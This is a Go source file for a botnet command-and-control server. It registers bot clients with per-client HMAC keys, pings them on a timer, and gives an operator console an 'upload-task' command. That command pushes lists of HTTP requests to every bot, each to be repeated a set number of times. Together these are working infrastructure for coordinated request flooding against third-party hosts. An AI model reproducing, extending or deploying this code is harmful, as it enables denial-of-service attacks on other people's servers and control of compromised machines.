package main

import (
	"bufio"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/jasonlvhit/gocron"
)

var mux sync.Mutex

const (
	// ClientPort - This is the port where the client server is hosted on
	ClientPort = ":4600"

	// Version - This is the current version of the botnet the server is running on
	Version = "0.0.1"

	// ClientIDLen - This specifies how long the base64-encoded client ID will be
	ClientIDLen = 32

	// PingTimeout - This is the timeout of a ping request
	PingTimeout = time.Second * 5
)

// Server - This is the server object. It stores all the data
// necessary for keeping track of the network and its clients
type Server struct {
	Clients map[string]Client
}

// HTTPRequest - My own HTTP struct, so I can serialize
// http requests
type HTTPRequest struct {
	Method  string            `json:"Method"`
	Host    string            `json:"Host"` // this is in the format of ip:port
	Path    string            `json:"Path"`
	Headers map[string]string `json:"Headers"`
	Body    []byte            `json:"Body"`
}

// Task - This contains the data pertaining to a certain task
// to be ran by the client
type Task struct {
	Requests []HTTPRequest `json:"Requests"`
	Times    uint32        `json:"Times"` // the number of times to send the requests
}

// Client - Struct to store info about clients and their states
type Client struct {
	IP     string
	ID     string
	Tasks  map[uint32]Task
	HMACSK []byte
}

// Request - Struct to store every attribute of a request.
// Put this into JSON when responding to a request
// Put this into POST request when sending a request
type Request struct {
	Type          string `json:"Type"`
	ID            string `json:"ID"`
	Message       string `json:"Message"`       // transmit a string message
	MessageBinary []byte `json:"MessageBinary"` // transmit binary data (encode to base64 URL encoding)
	Version       string `json:"Version"`
	HMACHash      []byte `json:"HMACHash"`
}

// GenerateRandomString - Used to generate a cryptographically-secure
// random string
func GenerateRandomString(n int) (string, error) {
	b := make([]byte, n)
	_, err := rand.Read(b)
	// Note that err == nil only if we read len(b) bytes.
	if err != nil {
		return "", err
	}

	randStr := base64.URLEncoding.EncodeToString(b)

	return randStr, nil
}

// SerializeTask - Takes in a pointer receiver of a task
// and serializes it using JSON
func (t *Task) SerializeTask() (string, error) {
	requestsSerialized, err := json.Marshal(t.Requests)
	if err != nil {
		return "", err
	}
	return string(requestsSerialized[:]), nil
}

// ParseRequest - Turns form values into request struct for ez access
func ParseRequest(r *http.Request) *Request {
	// Access form values
	rType := r.FormValue("Type")
	rID := r.FormValue("ID")
	rMessage := r.FormValue("Message")
	rMesssageBinaryUnparsed := r.FormValue("MessageBinary")
	rVersion := r.FormValue("Version")
	rHMACHashUnparsed := r.FormValue("HMACHash")

	// Change necessary types into their correct types
	rMessageBinary, err := base64.URLEncoding.DecodeString(rMesssageBinaryUnparsed)
	if err != nil {
		return nil
	}
	rHMACHash, err := base64.URLEncoding.DecodeString(rHMACHashUnparsed)
	if err != nil {
		fmt.Println(err.Error())
		return nil
	}

	// Use these to return an http.Request correctly
	return &Request{Type: rType, ID: rID, Message: rMessage, MessageBinary: rMessageBinary, Version: rVersion, HMACHash: rHMACHash}
}

// SerializeProtocolRequest - This turns a protocol request into a
// byte stream to be sent as a response to a request
func SerializeProtocolRequest(r *Request) ([]byte, error) {
	data, err := json.Marshal(r)
	if err != nil {
		return []byte(""), err
	}
	return data, nil
}

// DeserializeProtocolRequest - This turns a byte stream
// into a protocol request struct
func DeserializeProtocolRequest(data []byte) (Request, error) {
	r := &Request{}
	err := json.Unmarshal(data, r)
	if err != nil {
		return Request{}, err
	}
	return *r, nil
}

// IsValidClientID - Checks to see if the submitted client ID is valid
// If it is, it returns true. If it isn't, it returns valse.
// It does this by checking if the ID is registered with the server
func (s *Server) IsValidClientID(ID string) bool {
	if _, ok := s.Clients[ID]; ok {
		return true
	}
	return false
}

// HMACGenKey - Generates an HMAC secret key of sufficient length
// for HMAC-SHA256
func HMACGenKey() ([]byte, error) {
	n := 64
	b := make([]byte, n)
	_, err := rand.Read(b)
	// Note that err == nil only if we read len(b) bytes.
	if err != nil {
		return []byte(""), err
	}

	return b, nil
}

// HMACHash - Generates HMAC-SHA256 hash of
// parameters, "msg" using parameter "key".
// Returns raw bytes of expected HMAC
func HMACHash(key []byte, msg []byte) []byte {
	mac := hmac.New(sha256.New, key)
	mac.Write(msg)
	expectedMAC := mac.Sum(nil)
	return expectedMAC
}

// HMACHashRequest - Generates the HMAC hash of a request
// and returns a byte representation of it
func HMACHashRequest(key []byte, r *Request) []byte {
	data := []byte(r.Type + r.ID + r.Message + base64.URLEncoding.EncodeToString(r.MessageBinary) + r.Version)
	hash := HMACHash(key, data)
	return hash
}

// HMACValidateRequest - Validates the HMAC hash of a
// request by comparing it to the stored secret key.
// Returns true if the HMAC is valid
// Returns false if the HMAC is not valid
func (s *Server) HMACValidateRequest(r *Request) bool {
	expected := HMACHashRequest(s.Clients[r.ID].HMACSK, r)
	return hmac.Equal(expected, r.HMACHash)
}

// IsValidRequest - Checks for two things:
// - Client is registered
// - Client is who he says he is by checking the HMAC hashes
// Returns true if the request is valid
// Returns false if the request is not valid
func (s *Server) IsValidRequest(r *Request) bool {
	if _, ok := s.Clients[r.ID]; ok == false {
		return false
	}
	if s.HMACValidateRequest(r) == false {
		return false
	}
	return true
}

// HandleJoin - This is the API path used to handle a new client joining the network
func (s *Server) HandleJoin(w http.ResponseWriter, r *http.Request) {
	mux.Lock()
	defer mux.Unlock()
	if r.Method == "POST" {
		// Parse the request
		request := ParseRequest(r)

		// Check to see if the client is using an outdated or different version
		if request.Version != Version {
			log.Println("[Error - Nonfatal] Client using an outdated version")
			log.Println("\tIssuing update response")

			// Since the client is using an outdated version, we respond to their
			// join request by sending a request telling them to update their version
			response := Request{Type: "UPDATE", ID: "0", Message: "Please update your client to continue.",
				MessageBinary: []byte(""), Version: Version}
			responseSerialized, err := SerializeProtocolRequest(&response)
			if err != nil {
				// If we can't serialize the request, we just return an error
				log.Println("[Error - Nonfatal] Unable to serialize response to send to client")
				log.Println("\tReturning with StatusInternalServerError (500)")
				w.WriteHeader(http.StatusInternalServerError)
				w.Write([]byte("Error"))
				return
			}
			w.Write(responseSerialized)
			return
		}

		// Add the client to the network
		id, err := GenerateRandomString(ClientIDLen)
		if err != nil {
			return
		}
		_clientIP := r.RemoteAddr
		clientIP := strings.Split(_clientIP, ":")[0]
		clientHMACSK, err := HMACGenKey()
		if err != nil {
			return
		}
		newClient := Client{IP: clientIP, ID: id, Tasks: make(map[uint32]Task), HMACSK: clientHMACSK}

		// Send a response to the client
		// This response just assigns the client to an ID
		// by sending it a JOIN-RESP with the ID in the Message field
		response := Request{Type: "JOIN-RESP", ID: "0", Message: id, MessageBinary: clientHMACSK, Version: Version}
		responseSerialized, err := SerializeProtocolRequest(&response)
		if err != nil {
			log.Println("[Error - Nonfatal] Unable to serialize response to send to client")
			log.Println("\tReturning with StatusInternalServerError (500)")
			w.WriteHeader(http.StatusInternalServerError)
			w.Write([]byte("Error"))
			return
		}
		w.Write(responseSerialized)
		s.Clients[id] = newClient
	}
}

// HandleDone - Handle when a client tells us its done with a task
func (s *Server) HandleDone(w http.ResponseWriter, r *http.Request) {
	mux.Lock()
	defer mux.Unlock()
	if r.Method == "POST" {
		// Determine the tasks the client finished and remove them
		requestData := ParseRequest(r)
		if s.IsValidRequest(requestData) {
			TaskIDsSplit := strings.Split(requestData.Message, ",")
			if s.IsValidRequest(requestData) {
				for _, doneTaskID := range TaskIDsSplit {
					doneTaskIDToUint64, err := strconv.ParseUint(doneTaskID, 10, 32)
					if err != nil {
						log.Println("[Error - Nonfatal] Unable to deserialize doneTaskID to uint64")
						log.Println("\tReturning with StatusInternalServerError (500)")
						w.WriteHeader(http.StatusInternalServerError)
						w.Write([]byte("Error"))
						return
					}
					delete(s.Clients[requestData.ID].Tasks, uint32(doneTaskIDToUint64))
				}

				// Respond to the client with a success
				response := Request{Type: "DONE-RESP", ID: "0", Message: "Success", MessageBinary: []byte(""), Version: Version}
				hmacHash := HMACHashRequest(s.Clients[requestData.ID].HMACSK, &response)
				response.HMACHash = hmacHash
				responseSerialized, err := SerializeProtocolRequest(&response)
				if err != nil {
					log.Println("[Error - Nonfatal] Unable to serialize response to send to client")
					log.Println("\tReturning with StatusInternalServerError (500)")
					w.WriteHeader(http.StatusInternalServerError)
					w.Write([]byte("Error"))
					return
				}
				w.Write(responseSerialized)
			}
		} else {
			w.WriteHeader(http.StatusForbidden)
			w.Write([]byte("Error"))
		}
	}
}

// HandleDisconnect - Handle a client disconnecting
func (s *Server) HandleDisconnect(w http.ResponseWriter, r *http.Request) {
	mux.Lock()
	defer mux.Unlock()
	if r.Method == "POST" {
		requestData := ParseRequest(r)
		if s.IsValidRequest(requestData) {
			if s.IsValidRequest(requestData) {
				if s.IsValidRequest(requestData) {
					delete(s.Clients, requestData.ID)
					response := Request{Type: "DISCONNECT-RESP", ID: "0", Message: "Success", MessageBinary: []byte(""), Version: Version}
					hmacHash := HMACHashRequest(s.Clients[requestData.ID].HMACSK, &response)
					response.HMACHash = hmacHash
					responseSerialized, err := SerializeProtocolRequest(&response)
					if err != nil {
						log.Println("[Error - Nonfatal] Unable to serialize response to send to client")
						log.Println("\tReturning with StatusInternalServerError (500)")
						w.WriteHeader(http.StatusInternalServerError)
						w.Write([]byte("Error"))
						return
					}
					w.Write(responseSerialized)
				}
			}
		} else {
			w.WriteHeader(http.StatusForbidden)
			w.Write([]byte("Error"))
		}
	}
}

// HandlePing - Handles the /ping api path. When a client pings the server,
// they should receive a pong request as a response
func (s *Server) HandlePing(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		requestData := ParseRequest(r)
		if s.IsValidRequest(requestData) {
			response := Request{Type: "PONG", ID: "0", Message: "Success", MessageBinary: []byte(""), Version: Version}
			hmacHash := HMACHashRequest(s.Clients[requestData.ID].HMACSK, &response)
			response.HMACHash = hmacHash
			responseSerialized, err := SerializeProtocolRequest(&response)
			if err != nil {
				log.Println("[Error - Nonfatal] Unable to serialize response to send to client")
				log.Println("\tReturning with StatusInternalServerError (500)")
				w.WriteHeader(http.StatusInternalServerError)
				w.Write([]byte("Error"))
				return
			}
			w.Write(responseSerialized)
		} else {
			w.WriteHeader(http.StatusForbidden)
			w.Write([]byte("Error"))
		}
	}
}

// UploadTask - Tell the server to upload a task to all the clients
func (s *Server) UploadTask(t *Task) error {
	for _, v := range s.Clients {
		tasksSerialized, err := t.SerializeTask()
		if err != nil {
			return err
		}
		response := Request{Type: "UPLOADTASK", ID: "0",
			Message: tasksSerialized, MessageBinary: []byte(""), Version: Version}
		hmacHash := HMACHashRequest(v.HMACSK, &response)
		hmacHashBase64 := base64.URLEncoding.EncodeToString(hmacHash)

		_, err = http.PostForm("http://"+v.IP+ClientPort+"/uploadtask", url.Values{"Type": {"UPLOADTASK"}, "ID": {"0"},
			"Message": {tasksSerialized}, "MessageBinary": {""}, "Version": {Version},
			"HMACHash": {hmacHashBase64}})
		if err != nil {
			return err
		}
	}
	return nil
}

// PingClient - Pings the client to see if it is connected
// Returns true if a client successfully responded with a PONG
func (s *Server) PingClient(clientID string) bool {
	// Create an HTTP request to ping the client
	response := Request{Type: "PING", ID: "0",
		Message: "", MessageBinary: []byte(""), Version: Version}
	hmacHash := HMACHashRequest(s.Clients[clientID].HMACSK, &response)
	hmacHashBase64 := base64.URLEncoding.EncodeToString(hmacHash)

	formValues := url.Values{"Type": {"PING"}, "ID": {"0"},
		"Message": {""}, "MessageBinary": {""}, "Version": {Version},
		"HMACHash": {hmacHashBase64}}
	url := "http://" + s.Clients[clientID].IP + ClientPort + "/ping"
	client := &http.Client{Timeout: PingTimeout}
	req, err := http.NewRequest("POST", url, strings.NewReader(formValues.Encode()))
	if err != nil {
		return false
	}
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Content-Length", strconv.Itoa(len(formValues.Encode())))

	// Actually do the request
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	respData, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false
	}
	_, err = DeserializeProtocolRequest(respData)
	if err != nil {
		return false
	}

	// If the client actually didn't timeout or have any issues, return true
	// to signify that the ping was successful
	return true
}

// PingAllClients - This should be called every once in a while
// to check if the clients are still connected. The way it works is
// that it sends a ping request to all the connected clients.
// If an error occurs or the client exceeds the timeout to respond,
// it is considered a disconnected client and is removed from the
// currently connected clients
func (s *Server) PingAllClients() {
	log.Println("Pinging all clients to check for idle ones...")
	for _, v := range s.Clients {
		if s.PingClient(v.ID) == false {
			connected := s.PingClient(v.ID)
			if connected == false {
				mux.Lock()
				delete(s.Clients, v.ID)
				log.Printf("\nClient %s was idle\n", v.ID)
				mux.Unlock()
			}
		}
	}
	log.Println("Finished pinging all clients!")
}

// PrintHelp - prints the help message after typing in the help command into the terminal
func PrintHelp() {
	fmt.Printf("\n\n")
	fmt.Println("\t - help: Prints help message")
	fmt.Println("\t - quit: Terminates execution")
	fmt.Println("\t - upload-task: Uploads a task to all clients in the network")
	fmt.Println("\t\t - usage: upload-task <path-to-task-file>")
	fmt.Println("\t - list: List all clients")
	fmt.Println("\t - list-all: Lists all clients and their tasks")
	fmt.Println("\t - count: Prints out the number of currently-connected clients")
	fmt.Println("\t - ping: Pings all clients and automatically removes idle ones")
	fmt.Printf("\n\n")
}

// GetUserInput - Used to accept user commands
func GetUserInput(cwd string) string {
	reader := bufio.NewReader(os.Stdin)
	fmt.Printf("%s> ", cwd)
	command, err := reader.ReadString(byte('\n'))
	command = command[0 : len(command)-1]
	if err != nil {
		log.Println("[Error - Nonfatal] Unable to read stdin. If the error persists, ^C to terminate execution and restart the server.")
	}

	return command
}

// ListClients - Used to print all clients out to the command line
func (s *Server) ListClients() {
	mux.Lock()
	defer mux.Unlock()
	count := 0
	for k, v := range s.Clients {
		fmt.Printf("\n\t[%d] ID: %s | IP: %s\n", count, k, v.IP)
		count++
	}
}

// ListClientsAll - Same as ListClients but displays more information
func (s *Server) ListClientsAll() {
	mux.Lock()
	defer mux.Unlock()
	count := 0
	for k, v := range s.Clients {
		fmt.Printf("\n\t[%d] ID: %s | IP: %s\n", count, k, v.IP)
		fmt.Printf("\n\t%v\n", v.Tasks)
		count++
	}
}

// ParseTaskFile - Parse a file containing the JSON serialized version of a task
func ParseTaskFile(fpath string) (Task, error) {
	fdata, err := ioutil.ReadFile(fpath)
	if err != nil {
		return Task{}, err
	}
	var task Task
	err = json.Unmarshal(fdata, &task)
	if err != nil {
		return Task{}, err
	}
	return task, nil
}

// HandleUserInput - Used to handle user input from stdin
func (s *Server) HandleUserInput() {
	// Get the current working directory
	cwd, err := os.Getwd()
	if err != nil {
		log.Fatal("[Error - Fatal] Unable to get current working directory")
	}

	// Handle user input in this loop
	running := true
	for {
		// Check if the program is to be terminated here
		if running == false {
			break
		}

		// Read user-inputted command here
		command := GetUserInput(cwd)
		commandSplit := strings.Split(command, " ")
		switch commandSplit[0] {
		case "help":
			PrintHelp()
		case "quit":
			running = false
		case "list":
			s.ListClients()
		case "list-all":
			s.ListClientsAll()
		case "count":
			fmt.Printf("\tNumber of connected clients: %d\n", len(s.Clients))
		case "upload-task":
			if len(commandSplit) == 2 {
				task, err := ParseTaskFile(commandSplit[1])
				if err != nil {
					log.Println("[Error - Nonfatal]: Unable to deserialize requests from task file or read the task file itself.")
					log.Printf("\tError: %s\n", err.Error())
					log.Println("\tPlease fix the error and try again")
					continue
				}
				err = s.UploadTask(&task)
				if err != nil {
					log.Println("[Error - Nonfatal]: Unable to upload task.")
					log.Printf("\tError: %s\n", err.Error())
					log.Println("\tPlease fix the error and try again")
					continue
				}
			} else {
				log.Println("[Error - Nonfatal]: Incorrect command usage")
				log.Println("\tCorrect usage: upload-task <path-to-task-file>")
				continue
			}
		case "ping":
			s.PingAllClients()
		default:
			fmt.Printf("\nTry typing \"help\" in order to view the list of possible commands\n\n")
		}
	}
}

// RunCronJobs - Used to run cron jobs.
// Call this with a goroutine to prevent
// it from blocking the main event loop.
// BTW: This doesn't actually use cron (the Unix program)
func RunCronJobs(s *Server) {
	gocron.Every(2).Minutes().Do(s.PingAllClients)
	<-gocron.Start()
}

func main() {
	s := Server{Clients: make(map[string]Client)}
	http.HandleFunc("/join", s.HandleJoin)
	http.HandleFunc("/done", s.HandleDone)
	http.HandleFunc("/disconnect", s.HandleDisconnect)
	http.HandleFunc("/ping", s.HandlePing)
	go http.ListenAndServe(":8080", nil) // TODO: BUG: doesen't detect if there is an error listening
	go RunCronJobs(&s)
	s.HandleUserInput()
}
